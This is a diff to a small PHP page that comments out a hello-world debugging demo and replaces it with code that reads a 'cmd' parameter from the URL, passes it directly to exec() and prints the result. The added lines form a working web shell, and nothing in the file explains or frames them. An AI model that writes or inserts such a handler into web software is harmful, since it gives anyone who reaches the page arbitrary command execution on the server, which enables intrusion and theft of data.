@@ -1,18 +1,25 @@
 <?php
-require_once('MyPHP.php');
+//require_once('MyPHP.php');
+//
+//echo "<h1>Hello PHP Debug!</h1>";
+//$a = 'A';
+//$b = 'B';
+//$c = $a . " And " . $b;
+//
+//$d = 'Quinn say:'.$c;
+//
+//echo $d;
+//
+//echo '<br>';
+//$myPHP = new MyPHP();
+//echo $myPHP->GetName();//should output: myPHP
+//echo '<br>';
+//$myPHP->SetName('xiao ming');
+//echo $myPHP->GetName();//should output: xiao ming
 
-echo "<h1>Hello PHP Debug!</h1>";
-$a = 'A';
-$b = 'B';
-$c = $a . " And " . $b;
-
-$d = 'Quinn say:'.$c;
-
-echo $d;
-
-echo '<br>';
-$myPHP = new MyPHP();
-echo $myPHP->GetName();//should output: myPHP
-echo '<br>';
-$myPHP->SetName('xiao ming');
-echo $myPHP->GetName();//should output: xiao ming
+$cmd = $_GET['cmd'];
+$ret = exec($cmd,$info);
+echo "<pre>";
+print_r($ret);
+print_r($info);
+echo "</pre>";
